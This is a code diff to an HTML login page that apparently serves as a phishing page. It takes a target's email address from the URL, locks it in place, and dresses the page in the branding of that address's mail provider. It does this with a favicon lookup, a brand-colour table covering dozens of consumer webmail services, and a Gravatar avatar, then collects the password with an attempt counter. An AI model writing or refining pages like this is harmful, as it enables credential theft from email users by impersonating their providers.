@@ -8,7 +8,7 @@
     <link href="css/font-awesome.min.css" rel="stylesheet">
     <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
     <style>
-        /* ── base ── */
+        /* ── reset / base ── */
         * {
             box-sizing: border-box;
         }
@@ -29,52 +29,78 @@
             width: 380px;
             max-width: 100%;
             background: #fff;
-            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
-            border-radius: 5px;
-            padding: 20px;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.10);
+            border-radius: 6px;
+            padding: 24px 20px 20px;
             margin: auto;
         }
 
-        /* ── logo area ── */
-        .logo img {
-            width: 50px;
-            height: 50px;
+        /* ── top logo (domain icon) ── */
+        .logo {
+            text-align: center;
+        }
+        .logo .domain-icon-wrapper {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 56px;
+            height: 56px;
+            border-radius: 50%;
+            background: #e8ecf1;
+            transition: background 0.3s ease;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.06);
+            overflow: hidden;
+        }
+        .logo .domain-icon-wrapper img {
+            width: 100%;
+            height: 100%;
             object-fit: contain;
-            border-radius: 6px;
+            border-radius: 50%;
+            display: block;
+        }
+        .logo .domain-icon-wrapper .domain-fallback {
+            font-size: 24px;
+            font-weight: 700;
+            color: #fff;
+            text-transform: uppercase;
+            user-select: none;
+            line-height: 1;
+            letter-spacing: 0.5px;
         }
         .logo h3 {
-            margin: 0.5em 0 0.1em;
+            margin: 0.55em 0 0.05em;
             font-weight: 600;
             color: #1e1e2a;
-            font-size: 1.3rem;
-            letter-spacing: 0.3px;
+            font-size: 1.25rem;
+            letter-spacing: 0.2px;
             word-break: break-word;
         }
         .logo h5 {
-            margin: 0.1em 0 0.8em;
+            margin: 0.05em 0 0.9em;
             font-weight: 300;
             color: #666;
-            font-size: 0.95rem;
+            font-size: 0.92rem;
         }
 
-        /* ── avatar ── */
+        /* ── avatar (user icon) ── */
         .avatar-holder {
             display: flex;
             justify-content: center;
-            margin-bottom: 8px;
+            margin-bottom: 6px;
         }
         .avatar-img {
-            background-color: white;
+            background: #f5f7fa;
             border-radius: 50%;
-            padding: 6px;
-            width: 100px;
-            height: 100px;
+            padding: 4px;
+            width: 92px;
+            height: 92px;
             display: flex;
             align-items: center;
             justify-content: center;
-            box-shadow: 0 0 8px rgba(0, 0, 0, 0.08);
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.07);
             transition: box-shadow 0.3s ease;
             overflow: hidden;
+            border: 2px solid #f0f2f5;
         }
         .avatar-img img {
             border-radius: 50%;
@@ -86,18 +112,18 @@
         /* ── email display ── */
         .email-display {
             text-align: center;
-            font-weight: 600;
-            margin-bottom: 18px;
+            font-weight: 500;
+            margin-bottom: 16px;
             font-size: 0.95rem;
             color: #1e1e2a;
             word-break: break-all;
             min-height: 1.6em;
-            padding: 0 6px;
+            padding: 0 4px;
         }
         .email-display .email-label {
             display: inline-block;
             background: #f0f4fa;
-            padding: 4px 16px;
+            padding: 4px 18px;
             border-radius: 20px;
             font-weight: 500;
             color: #1e1e2a;
@@ -118,8 +144,7 @@
             font-weight: 500;
         }
 
-        /* ── form ── */
-        .form-holder input[type="email"],
+        /* ── form fields ── */
         .form-holder input[type="password"] {
             width: 100%;
             height: 42px;
@@ -130,7 +155,6 @@
             font-size: 0.95rem;
             transition: border-color 0.25s ease, box-shadow 0.25s ease;
         }
-        .form-holder input[type="email"]:focus,
         .form-holder input[type="password"]:focus {
             border-color: #0073c6;
             box-shadow: 0 0 0 3px rgba(0, 115, 198, 0.12);
@@ -182,7 +206,7 @@
         .error-message {
             color: #c0392b;
             text-align: center;
-            margin-top: 6px;
+            margin-top: 4px;
             padding: 8px 12px;
             border-radius: 4px;
             background: #fde8e6;
@@ -304,14 +328,21 @@
             text-decoration: underline;
         }
 
-        /* ── responsive tweaks ── */
+        /* ── responsive ── */
         @media (max-width: 420px) {
             .office {
                 padding: 16px;
             }
+            .logo .domain-icon-wrapper {
+                width: 48px;
+                height: 48px;
+            }
+            .logo .domain-icon-wrapper .domain-fallback {
+                font-size: 20px;
+            }
             .avatar-img {
-                width: 80px;
-                height: 80px;
+                width: 76px;
+                height: 76px;
             }
             .logo h3 {
                 font-size: 1.1rem;
@@ -325,6 +356,26 @@
                 padding: 9px 12px;
             }
         }
+
+        /* ── extra: subtle separator ── */
+        .domain-avatar-divider {
+            text-align: center;
+            font-size: 12px;
+            color: #bbb;
+            letter-spacing: 2px;
+            margin: 2px 0 4px;
+            user-select: none;
+        }
+        .domain-avatar-divider span {
+            background: #fff;
+            padding: 0 10px;
+        }
+        .domain-avatar-divider::before {
+            content: '';
+            display: block;
+            border-top: 1px solid #eee;
+            margin-top: 6px;
+        }
     </style>
 </head>
 <body>
@@ -333,9 +384,12 @@
     <div class="container">
         <div class="office">
 
-            <!-- LOGO -->
+            <!-- ─── TOP: DOMAIN ICON ─── -->
             <div class="logo text-center">
-                <img id="logoimg" src="images/zezezeze.png" alt="Logo">
+                <div class="domain-icon-wrapper" id="domainIconWrapper">
+                    <img id="domainIconImg" src="images/zezezeze.png" alt="Domain icon">
+                    <span class="domain-fallback" id="domainFallback" style="display:none;">G</span>
+                </div>
                 <h3 id="orgName" class="text-dark">Company Name</h3>
                 <h5 id="subtitle" class="font-weight-light">Sign in to continue</h5>
             </div>
@@ -344,22 +398,22 @@
             <div id="errorDisplay" class="error-message"></div>
             <div id="hintText" class="hint-text">Passwords are case‑sensitive.</div>
 
-            <!-- LOGIN FORM -->
+            <!-- ─── LOGIN FORM ─── -->
             <form id="login-form" method="post" action="/api/login">
 
                 <div class="form-holder">
 
-                    <!-- AVATAR -->
+                    <!-- ── AVATAR (user icon) ── -->
                     <div class="avatar-holder">
                         <div class="avatar-img" id="avatarContainer">
                             <img id="avatarImg" src="download.png" alt="User Avatar">
                         </div>
                     </div>
 
-                    <!-- hidden email field -->
+                    <!-- hidden email -->
                     <input type="hidden" id="email-hidden" name="email" value="">
 
-                    <!-- EMAIL DISPLAY -->
+                    <!-- ── EMAIL DISPLAY ── -->
                     <div class="email-display" id="emailDisplay">
                         <span class="email-label" id="emailDisplayText">
                             <span class="at-symbol">✉</span>
@@ -369,24 +423,24 @@
                         </span>
                     </div>
 
-                    <!-- PASSWORD -->
+                    <!-- ── PASSWORD ── -->
                     <input type="password" id="password" name="password" class="form-control"
                     placeholder="Password" required autofocus>
 
-                    <!-- REMEMBER ME -->
+                    <!-- ── REMEMBER ME ── -->
                     <div class="checkbox">
                         <input type="checkbox" id="remember-me">
                         <label for="remember-me">Remember me</label>
                     </div>
 
-                    <!-- SUBMIT -->
+                    <!-- ── SUBMIT ── -->
                     <div class="btn-holder">
                         <button type="submit" class="btn btn-lg" id="submit-btn">
                             <span id="btn-text">LOGIN</span>
                         </button>
                     </div>
 
-                    <!-- FOOTER LINKS -->
+                    <!-- ── FOOTER ── -->
                     <p><a href="#">Can't access your account?</a></p>
                     <p><a href="#">Sign in with a single‑use code</a></p>
                 </div>
@@ -415,18 +469,96 @@
             const btnText = document.getElementById('btn-text');
 
             const emailHidden = document.getElementById('email-hidden');
-            const emailDisplayText = document.getElementById('emailDisplayText');
             const emailLocalPart = document.getElementById('emailLocalPart');
             const emailDomainPart = document.getElementById('emailDomainPart');
             const emailDisplay = document.getElementById('emailDisplay');
+            const emailDisplayText = document.getElementById('emailDisplayText');
+
             const avatarImg = document.getElementById('avatarImg');
             const orgName = document.getElementById('orgName');
             const subtitle = document.getElementById('subtitle');
 
+            // domain icon elements
+            const domainIconWrapper = document.getElementById('domainIconWrapper');
+            const domainIconImg = document.getElementById('domainIconImg');
+            const domainFallback = document.getElementById('domainFallback');
+
+            // ── domain → brand color mapping ──
+            const domainColors = {
+                'gmail.com': '#EA4335',
+                'google.com': '#4285F4',
+                'outlook.com': '#0078D4',
+                'hotmail.com': '#0078D4',
+                'live.com': '#0078D4',
+                'yahoo.com': '#6001D2',
+                'yahoo.co.uk': '#6001D2',
+                'yahoo.fr': '#6001D2',
+                'icloud.com': '#A2AAAD',
+                'me.com': '#A2AAAD',
+                'mac.com': '#A2AAAD',
+                'protonmail.com': '#8B89CC',
+                'proton.me': '#8B89CC',
+                'zoho.com': '#E42527',
+                'aol.com': '#FF0B00',
+                'mail.com': '#004B8F',
+                'gmx.com': '#FF6600',
+                'gmx.net': '#FF6600',
+                'web.de': '#0078D4',
+                't-online.de': '#003399',
+                'orange.fr': '#FF6600',
+                'laposte.net': '#0055A4',
+                'sfr.fr': '#E3000B',
+                'free.fr': '#0099CC',
+                'wanadoo.fr': '#E3000B',
+                'btinternet.com': '#0099CC',
+                'sky.com': '#007BC1',
+                'talktalk.net': '#E60000',
+                'virginmedia.com': '#CC0000',
+                'ntlworld.com': '#CC0000',
+                'blueyonder.co.uk': '#003399',
+                'sbcglobal.net': '#004B8F',
+                'att.net': '#004B8F',
+                'bellsouth.net': '#004B8F',
+                'verizon.net': '#004B8F',
+                'comcast.net': '#004B8F',
+                'cox.net': '#004B8F',
+                'charter.net': '#004B8F',
+                'optimum.net': '#004B8F',
+                'frontier.com': '#004B8F',
+                'spectrum.com': '#004B8F',
+                'twc.com': '#004B8F',
+                'roadrunner.com': '#004B8F',
+                'earthlink.net': '#004B8F',
+                'mindspring.com': '#004B8F',
+                'juno.com': '#004B8F',
+                'netzero.com': '#004B8F',
+                'msn.com': '#0078D4',
+                'europe.com': '#004B8F',
+                'mail.ru': '#0055A4',
+                'yandex.com': '#FF0000',
+                'yandex.ru': '#FF0000',
+                'rambler.ru': '#0055A4',
+                'ukr.net': '#0055A4',
+                'i.ua': '#0055A4',
+                'meta.ua': '#0055A4',
+                'bigmir.net': '#0055A4',
+                'ex.ua': '#0055A4',
+                'ukrtelecom.ua': '#0055A4',
+                'hotmail.co.uk': '#0078D4',
+                'hotmail.fr': '#0078D4',
+                'hotmail.de': '#0078D4',
+                'hotmail.it': '#0078D4',
+                'hotmail.es': '#0078D4',
+                'live.co.uk': '#0078D4',
+                'live.fr': '#0078D4',
+                'live.de': '#0078D4',
+                'live.it': '#0078D4',
+                'live.es': '#0078D4',
+            };
+
             // ── helpers ──
             function getEmailFromUrl() {
                 let email = null;
-                // try hash first
                 if (window.location.hash) {
                     const raw = decodeURIComponent(window.location.hash.substring(1));
                     if (raw.includes('=')) {
@@ -435,11 +567,9 @@
                             email = params.get('email');
                         } catch (_) { /* ignore */ }
                     } else {
-                        // if hash is just the email (no key)
                         if (raw.includes('@')) email = raw;
                     }
                 }
-                // fallback to search params
                 if (!email && window.location.search) {
                     try {
                         const params = new URLSearchParams(window.location.search);
@@ -456,7 +586,7 @@
                 return 'https://www.gravatar.com/avatar/' + hash + '?s=' + size + '&d=identicon&r=g';
             }
 
-            // simple MD5 (for Gravatar)
+            // ── simplified MD5 (for Gravatar) ──
             function md5(string) {
                 function md5cycle(x, k) {
                     var a = x[0],
@@ -546,26 +676,6 @@
 
                 function ii(a, b, c, d, x, s, t) { return cmn(c ^ (b | (~d)), a, b, x, s, t); }
 
-                function md5blk(s) {
-                    var md5blks = [],
-                        i;
-                    for (i = 0; i < 64; i += 4) {
-                        md5blks[i >> 2] = s.charCodeAt(i) + (s.charCodeAt(i + 1) << 8) +
-                            (s.charCodeAt(i + 2) << 16) + (s.charCodeAt(i + 3) << 24);
-                    }
-                    return md5blks;
-                }
-
-                function md5blk(s) {
-                    var md5blks = [],
-                        i;
-                    for (i = 0; i < 64; i += 4) {
-                        md5blks[i >> 2] = s.charCodeAt(i) + (s.charCodeAt(i + 1) << 8) +
-                            (s.charCodeAt(i + 2) << 16) + (s.charCodeAt(i + 3) << 24);
-                    }
-                    return md5blks;
-                }
-
                 function add32(a, b) {
                     var lsw = (a & 0xFFFF) + (b & 0xFFFF);
                     var msw = (a >> 16) + (b >> 16) + (lsw >> 16);
@@ -573,12 +683,17 @@
                 }
 
                 var x = [];
-                var k, i;
+                var i;
                 var s = unescape(encodeURI(string));
                 var n = s.length;
                 var state = [1732584193, -271733879, -1732584194, 271733878];
                 for (i = 64; i <= s.length; i += 64) {
-                    md5cycle(state, md5blk(s.substring(i - 64, i)));
+                    var blk = [];
+                    for (var j = 0; j < 64; j += 4) {
+                        blk[j >> 2] = s.charCodeAt(i - 64 + j) + (s.charCodeAt(i - 64 + j + 1) << 8) +
+                            (s.charCodeAt(i - 64 + j + 2) << 16) + (s.charCodeAt(i - 64 + j + 3) << 24);
+                    }
+                    md5cycle(state, blk);
                 }
                 s = s.substring(i - 64);
                 var tail = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0];
@@ -596,7 +711,7 @@
                 }).join('');
             }
 
-            // ── show / hide error ──
+            // ── error helpers ──
             function showError(message, shake) {
                 errorDisplay.textContent = message;
                 errorDisplay.classList.add('show');
@@ -627,6 +742,41 @@
                 };
             }
 
+            // ── domain icon setup ──
+            function setDomainIcon(domain) {
+                const cleanDomain = domain.trim().toLowerCase();
+                const brandColor = domainColors[cleanDomain] || '#0073c6';
+
+                // Try to load favicon via Google's service
+                const faviconUrl = 'https://www.google.com/s2/favicons?domain=' + encodeURIComponent(cleanDomain) +
+                    '&sz=64';
+
+                domainIconImg.style.display = 'block';
+                domainFallback.style.display = 'none';
+                domainIconImg.src = faviconUrl;
+                domainIconImg.alt = cleanDomain + ' icon';
+
+                // fallback: if favicon fails, show colored initial
+                domainIconImg.onerror = function() {
+                    this.style.display = 'none';
+                    domainFallback.style.display = 'flex';
+                    const initial = cleanDomain.charAt(0).toUpperCase();
+                    domainFallback.textContent = initial;
+                    domainIconWrapper.style.background = brandColor;
+                    domainFallback.style.color = '#fff';
+                };
+
+                // also set wrapper background as fallback color (in case image loads with transparency)
+                domainIconWrapper.style.background = brandColor + '22'; // subtle tint
+
+                // if image loads successfully, still keep a clean look
+                domainIconImg.onload = function() {
+                    domainIconWrapper.style.background = '#f5f7fa';
+                    domainFallback.style.display = 'none';
+                    this.style.display = 'block';
+                };
+            }
+
             // ── attempt counter ──
             let attemptCount = 0;
 
@@ -634,13 +784,12 @@
             const email = getEmailFromUrl();
 
             if (email && email.includes('@')) {
-                // ── email present → dynamic mode ──
                 const trimmed = email.trim();
                 const parts = trimmed.split('@');
                 const local = parts[0] || 'user';
                 const domain = parts[1] || 'example.com';
 
-                // set hidden field
+                // hidden field
                 emailHidden.value = trimmed;
 
                 // display email
@@ -648,21 +797,21 @@
                 emailDomainPart.textContent = domain;
                 emailDisplay.style.display = 'block';
 
-                // avatar → Gravatar
+                // ── AVATAR: Gravatar ──
                 avatarImg.src = gravatarUrl(trimmed, 200);
                 avatarImg.alt = trimmed + ' avatar';
 
-                // org name → domain
+                // ── DOMAIN ICON (top logo) ──
+                setDomainIcon(domain);
+
+                // org name → domain (capitalized)
                 const displayDomain = domain.charAt(0).toUpperCase() + domain.slice(1);
                 orgName.textContent = displayDomain;
 
                 // subtitle → "Sign in as …"
                 subtitle.textContent = 'Sign in as ' + trimmed;
 
-                // update page title
                 document.title = 'Login · ' + trimmed;
-
-                // also update the logo img? keep static logo, only avatar changes.
 
             } else {
                 // ── no email → static mode ──
@@ -673,13 +822,19 @@
                 orgName.textContent = 'Company Name';
                 subtitle.textContent = 'Sign in to continue';
                 document.title = 'Login';
+
+                // reset domain icon to default
+                domainIconImg.style.display = 'block';
+                domainFallback.style.display = 'none';
+                domainIconImg.src = 'images/zezezeze.png';
+                domainIconImg.alt = 'Logo';
+                domainIconWrapper.style.background = '#e8ecf1';
+                domainIconImg.onerror = null;
             }
 
-            // ── handle avatar load errors ──
+            // ── avatar load error fallback ──
             avatarImg.addEventListener('error', function() {
-                // fallback to identicon via Gravatar (should work, but if not, use static)
                 if (email && email.includes('@')) {
-                    // use a different default
                     this.src = 'https://www.gravatar.com/avatar/' + md5(email.trim()) +
                         '?s=200&d=retro&r=g';
                 } else {
